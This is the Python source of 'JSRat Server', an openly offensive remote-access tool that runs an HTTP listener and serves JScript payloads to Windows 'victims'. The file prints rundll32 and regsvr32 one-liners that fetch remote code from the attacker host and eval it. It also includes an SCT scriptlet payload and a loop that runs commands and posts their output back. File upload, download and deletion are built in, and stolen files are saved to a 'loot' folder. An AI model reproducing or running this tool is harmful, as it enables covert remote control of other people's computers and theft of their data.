#!/usr/bin/env python
#
# JSRat Server - Python Implementation
# By: Hood3dRob1n
# Mod: b4rtik
#
"""
   Simple JS Reverse Shell over HTTP for Windows
   We run web server and then execute commands against the connecting Client/Victim
  
   Command to Launch JS Reverse Shell from Client||Victim Windows box:
   Using rundll32 method to invoke client:
   rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://10.10.10.10:31337/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}

   Using regsvr32 method to invoke client:
   regsvr32.exe /u /n /s /i:http://10.10.10.10:31337/file.sct scrobj.dll


   $(JSRat)> cmd /c dir C:\

   References & Original Projects:
      regsvr32: https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
      rundll32: https://gist.github.com/subTee/f1603fa5c15d5f8825c0
      http://en.wooyun.io/2016/01/18/JavaScript-Backdoor.html
      http://en.wooyun.io/2016/02/04/42.html

"""

import optparse, os, re, socket, SocketServer, sys
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from classes.colors import *
import requests # Used for --find-ip option, otherwise not needed
global command
command = 'ver'
try:
  import readline
except:
  error("No Python Readline");
  pad(); bad("No history support as a result, sorry...");


def banner():
  cls();
  print red("\nJSRat Server") + white(" - ") + blue("Python ") + yellow("Implementation");
  print blue("By") + white(": Hood3dRob1n");


def cls():
  if os.name == 'nt' or sys.platform.startswith('win'):
    os.system('cls');
  else:
    os.system('clear');


def internal_ip():
  'Check Internal IP' # Google IP address used...
  try:
    iip = [(s.connect(('8.8.8.8', 80)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  except:
    error("Problem resolving internal IP!")
    return "Problem resolving internal IP!"
  return iip


def external_ip():
  'Check External IP using checkip.dyndns.org'
  url = 'http://checkip.dyndns.org/' # Simple External IP Check using dyndns...
  try:
    headers = { 'User-agent' : 'Python External IP Checker v0.01b' } 
    res = requests.get( url, headers=headers, timeout=30.0 )
    body = str( res.text )
    extip = re.search('\d+\.\d+\.\d+\.\d+', body)
  except:
    error("Problem resolving extrernal IP!")
    return "Problem resolving extrernal IP!"
  return extip.group()


def jsrat():
  """
      Build & Return the core JS code to operate JSRat on victim
      Essentially serve up additional JS to be evaluated by client based on need
      NOTE: Client must be using IE browser, or all bets are off - but you should know this already...
  """
  jsrat_code = """
			while(true) {
				h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
				h.SetTimeouts(0, 0, 0, 0);
                        	try {
					h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					h.Send();
					c = "Enter metasploit or PowerShell Empire one liner here in the form of cmd /c [powershell oneliner]"
                            		        r = new ActiveXObject("WScript.Shell").Exec(c);
				    		var so;
				    		while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
						p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
				    		p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
			 	       		p.Send(so + "\\n");
                            		
                        	} catch(e1) {
                            		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                            		p.SetTimeouts(0, 0, 0, 0);
					p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
                            		p.Send("[ERROR - No Output]\\n");
				}
			}
		"""
  return jsrat_code;


def jsrat_regsrv():
  """
      Build & Return the core JS code embedded inside of SCT file
	Used to operate JSRat on victim when invoked via regsrc32 method
  """
  jsrat_regsrv_code = '<?XML version="1.0"?>\n';
  jsrat_regsrv_code += "  <scriptlet>\n";
  jsrat_regsrv_code += "    <registration \n";
  jsrat_regsrv_code += '      progid="Bangarang"\n';
  jsrat_regsrv_code += '      version="1.01"\n';
  jsrat_regsrv_code += '      classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >\n';
  jsrat_regsrv_code += '      <script language="JScript">\n';
  jsrat_regsrv_code += '        <![CDATA[\n\n';
  jsrat_regsrv_code += jsrat();
  jsrat_regsrv_code += '        ]]>\n';
  jsrat_regsrv_code += "      </script>\n";
  jsrat_regsrv_code += "    </registration>\n";
  jsrat_regsrv_code += "  </scriptlet>"
  return jsrat_regsrv_code;


def print_jsrat_help():
  """
      Displays JSRat options for Server operator to interact w/Client||Victim
  """
  print
  print white(underline("JSRat Usage Options:"));
  print green("      CMD") + white(" => ") + green("Executes Provided Command");
  print green("      run") + white(" => ") + green("Run EXE or Script");
  print green("     read") + white(" => ") + green("Read File");
  print green("   upload") + white(" => ") + green("Upload File");
  print green(" download") + white(" => ") + green("Download File");
  print green("   delete") + white(" => ") + green("Delete File");
  print green("     help") + white(" => ") + green("Help Menu");
  print green("     exit") + white(" => ") + green("Exit Shell");
  print



def get_user_input():
  try:
    while True:
      usr_input = raw_input(red("$")+white("(")+blue("JSRat")+white(")")+red(">")+white(" "));
      if usr_input.strip() != "":
        break
      else:
        print
  except KeyboardInterrupt:
    print "\n";
    print red("[") + white("WARNING") + red("]") + white(" CTRL+C, closing session...\n\n");
    sys.exit();
  return usr_input.strip();


class myHandler(BaseHTTPRequestHandler):
  """
      Custom handler so we can control how different web requests are processed
      Crude setup I threw together, but it works so get over it...
  """
  js_load_path = '/connect'   # Base URL path to initialize rundll32 client (value is overridden at server start)
  sct_load_path = '/file.sct' # Base URL path to initialize regsvr32 client (value is overridden at server start)
  upload_path = "";           # static so we can set/get as needed, since this isnt powershell...
  time_to_stop = False;

  def log_message(self, format, *args):
    """ Custom Log Handler to Spit out on to stderr """
    return

  def do_GET(self):
    """
        Handle any GET requests coming into our server
    """
    content_type = "text/plain";
    response_message = jsrat();
    if self.js_load_path == self.path:
      # invoked via rrundll32 method
      good("Incoming JSRat rundll32 Invoked Client: %s" % str(self.client_address[0]));
      if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
        pad(); good("User-Agent: %s" % self.headers['User-Agent'])
      print_jsrat_help();

    elif self.sct_load_path == self.path:
      global client_type
      client_type = 2; # invoked via regsvr32 method
      response_message = jsrat_regsrv();
      good("Incoming JSRat regsvr32 Invoked Client: %s" % str(self.client_address[0]));
      if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
        pad(); good("User-Agent: %s" % self.headers['User-Agent'])
      print_jsrat_help();

    elif "/uploadpath" == self.path:
      lpath = raw_input(red("$")+white("(")+blue("Enter Full Path for Local File to Upload")+white(")")+red(">")+white(" "));
      myHandler.upload_path = lpath;
      caution("Setting local upload path to: %s" % myHandler.upload_path)
      destination_path = raw_input(red("$")+white("(")+blue("Enter Remote Path to Write Uploaded Content")+white(")")+red(">")+white(" "));
      response_message = destination_path.strip();

    elif "/uploaddata" == self.path:
      response_message = open(myHandler.upload_path, 'rb+').read();
      myHandler.upload_path = ""; 

    elif "/hook" == self.path:
      good("Hooking Client: %s" % str(self.client_address[0]));
      content_type = "text/html";
      response_message = jsrat();
      response_message = """<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
  <head>
   <title> new document </title>
   <meta name="generator" content="editplus">
   <meta name="author" content="">
   <meta name="keywords" content="">
   <meta name="description" content="">
  </head>
  <body>
   <script language="javascript" type="text/javascript">
      h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
      h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);
      h.Send();
      B=h.ResponseText;
      eval(B);
    </script>
  </body>
</html>"""

    elif "/wtf" == self.path:
      good("Client Command Query from: %s" % str(self.client_address[0]));
      response_message = """
rundll32 Method for Client Invocation:
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}

regsvr32 Method for Client Invocation:
regsvr32.exe /u /n /s /i:http://"""+bind_ip+":"+str(listener_port)+srv_sct+""" scrobj.dll
"""
      print cyan(response_message + "\n");

    # Send the built response back to client
    self.send_response(200);
    self.send_header('Content-type',content_type);
    self.end_headers();
    self.wfile.write(response_message);


  def do_POST(self):
    """
        Handle any POST requests coming into our server
    """
    if "/rat" == self.path:
      content_len = int(self.headers.getheader('content-length', 0))
      post_body = self.rfile.read(content_len)
      print cyan(post_body);
      if post_body == "[No Output]":
        print
      self.send_response(200);
      self.send_header('Content-type','text/plain');
      self.end_headers();

    elif "/download" == self.path:
      content_len = int(self.headers.getheader('content-length', 0))
      post_body = self.rfile.read(content_len)
      fname = raw_input(red("$")+white("(")+blue("Enter Filename to Save in ./loot/")+white(")")+red(">")+white(" "));
      try:
        loot_file = outdir.strip()+fname.strip();
        fh = open(loot_file, 'wb+')
        fh.write(post_body)
        fh.close()
        pad(); good("Successfully Saved To: %s\n" % loot_file.replace(home, "./"))
      except Exception, e:
        error("Problem saving content to:")
        pad(); bad("%s" % loot_file.replace(home, "./"))
        pad(); pad(); bad(str(e));
      self.send_response(200);
      self.send_header('Content-type','text/plain');
      self.end_headers();
    else:
      caution("%s - Snooper detected..." % str(self.client_address[0]));
      pad(); caution("=> %s" % self.path);
      self.send_error(404);

class SendCMDHandler(BaseHTTPRequestHandler):
  """
      Send command handler so we can auto send command to clinets...
  """
  js_load_path = '/connect' # Base URL path to initialize things (value is overridden at server start)
  upload_path = "" # static so we can set/get as needed, since this isnt powershell...
  time_to_stop = False

  def log_message(self, format, *args):
    """ Custom Log Handler to Spit out on to stderr """
    return

  def do_GET(self):
    """
        Handle any GET requests coming into our server
    """
    content_type = "text/plain"
    response_message = jsrat()
    if self.js_load_path == self.path:
      # invoked via rrundll32 method
      good("Incoming JSRat rundll32 Invoked Client: %s" % str(self.client_address[0]));
      if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
        pad(); good("User-Agent: %s" % self.headers['User-Agent'])
      print_jsrat_help();

    elif self.sct_load_path == self.path:
      global client_type
      client_type = 2; # invoked via regsvr32 method
      response_message = jsrat_regsrv();
      good("Incoming JSRat regsvr32 Invoked Client: %s" % str(self.client_address[0]));
      if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
        pad(); good("User-Agent: %s" % self.headers['User-Agent'])
      print_jsrat_help();

    elif "/rat" == self.path:
      #Send command
      good("OK, Success Send command to Client...")
      caution("Hit CTRL+C to kill server....")

    elif "/hook" == self.path:
      good("Hooking Client: %s" % str(self.client_address[0]))
      content_type = "text/html"
      response_message = jsrat()
      response_message = """<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
  <head>
   <title> new document </title>
   <meta name="generator" content="editplus">
   <meta name="author" content="">
   <meta name="keywords" content="">
   <meta name="description" content="">
  </head>
  <body>
   <script language="javascript" type="text/javascript">
      h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
      h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);
      h.Send();
      B=h.ResponseText;
      eval(B);
    </script>
  </body>
</html>"""

    elif "/wtf" == self.path:
      good("Client Command Query from: %s" % str(self.client_address[0]))
      response_message = """
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}"""
      print cyan(response_message + "\n")

    # Send the built response back to client
    self.send_response(200)
    self.send_header('Content-type',content_type)
    self.end_headers()
    self.wfile.write(response_message)


  def do_POST(self):
    """
        Handle any POST requests coming into our server
    """
    if "/rat" == self.path:
      content_len = int(self.headers.getheader('content-length', 0))
      post_body = self.rfile.read(content_len)
      print cyan(post_body)
      if post_body == "[No Output]":
        print
      self.send_response(200)
      self.send_header('Content-type','text/plain')
      self.end_headers()

def main():
  """ 
      Establish our base web server and initiate the event loop to drive things

      1 - Overrides custom handler path for URL to initiate things
      2 - Binds socket to ip and port, and then maps to our custom handler
      3 - Starts endless event loop & pass off for myHandler to handle requests
  """
  try:
    print
    global httpd;
    if options.cmd in args:
    	SendCMDHandler.js_load_path = srv_url
    	httpd = SocketServer.TCPServer((bind_ip, listener_port),SendCMDHandler)
    else:
    	myHandler.js_load_path = srv_url
    	httpd = SocketServer.TCPServer((bind_ip, listener_port), myHandler)
    status("Web Server Started on Port: %d" % listener_port);
    status("Awaiting Client Connection to: ");
    pad(); status("rundll32 invocation: http://%s:%s%s" % (bind_ip, listener_port, srv_url));
    pad(); status("regsvr32 invocation: http://%s:%s%s" % (bind_ip, listener_port, srv_sct));
    pad(); pad(); status("Client Command at: http://%s:%s/wtf" % (bind_ip, listener_port));
    pad(); pad(); status("Browser Hook Set at: http://%s:%s/hook\n" % (bind_ip, listener_port));
    caution("Hit CTRL+C to Stop the Server at any time...\n");
    httpd.serve_forever();
  except socket.error, e:
    error('Try again in 30 seconds or so...')
    pad();  bad('Socket Error:\n\t%s\n' % e)
  except KeyboardInterrupt:
    print ''
    error("CTRL+C Interupt Detected!");
    pad(); bad("Shutting Down Web Server...\n");
    httpd.shutdown;



# Parse Arguments/Options
parser = optparse.OptionParser(banner(), version="%prog v0.02b");
parser.add_option("-i", "--ip", dest="ip", default=None, type="string", help="IP to Bind Server to (i.e. 192.168.0.69)");
parser.add_option("-p", "--port", dest="port", default=None, type="int", help="Port to Run Server on");
parser.add_option("-u", "--run-url", dest="url", default="/connect", type="string", help="URL for rundll32 Client Invocation (default: /connect)");
parser.add_option("-s", "--sct-name", dest="sct", default="file.sct", type="string", help="Filename for regsvr32 Client Invocation (default: [/]file.sct)");
parser.add_option("-f", "--find-ip", action="count", default=0, dest="fip", help="Display Current Internal and External IP Addresses");
parser.add_option("-c", "--command", default="whoami", type="string", dest="cmd", help="auto Send command to client (No interaction)")
parser.add_option("-v", action="count", default=0, dest="verbose", help="Enable Verbose Output");
(options, args) = parser.parse_args();

# Make sure we got necessary arguments
args = sys.argv[1:];
if not args:
  print "";
  parser.print_help();
  print;
  sys.exit();

if options.fip:
  print; status("Checking IP....")
  pad(); good("Internal IP: %s" % internal_ip())
  pad(); good("External IP: %s\n\n" % external_ip())
  sys.exit();

# Establish IP to bind our web server to (i.e. 127.0.0.1||192.168.0.69||10.10.10.10)
if args and options.ip == None:
  print ' ';
  error("Missing Argument: --ip IP");
  sys.stdout.write('   ');
  error("You need to provide the IP to bind server to!\n");
  parser.print_help();
  print;
  sys.exit();
else:
  bind_ip = options.ip;

# Establish listner port for our web server (privs needed for low ports < 1024)
if args and options.port == None:
  print ' ';
  error("Missing Argument: --port PORTNUMBER");
  sys.stdout.write('   ');
  error("You need to provide the port to listen on!\n");
  parser.print_help();
  print;
  sys.exit();
else:
  listener_port = options.port;

# Establish system based file seperator
if os.name == 'nt' or sys.platform.startswith('win'):
  delimiter = "\\";
else:
  delimiter = "/";

global client_type;
client_type=1;
srv_url    = options.url;     # The URL path to start rundll32 client invocation
srv_sct    = "/"+options.sct;     # The SCT Filename to start regsvr32 client invoke
verbose    = options.verbose; # Enable verbose output for debugging purposes
home       = os.path.dirname(os.path.abspath(__file__)) + delimiter; # Home dir
outdir     = home + "loot" + delimiter;  # Output directory to save content
if not os.path.isfile(outdir) and not os.path.isdir(outdir):
  os.mkdir(outdir);           # Create output directory if it doesn't exist


# Time for the magic show
if __name__ == "__main__":
  try:
    main();

  except KeyboardInterrupt:
    print "\n";
    print red("[") + white("WARNING") + red("]") + white(" CTRL+C, closing session...\n\n");
    sys.exit();

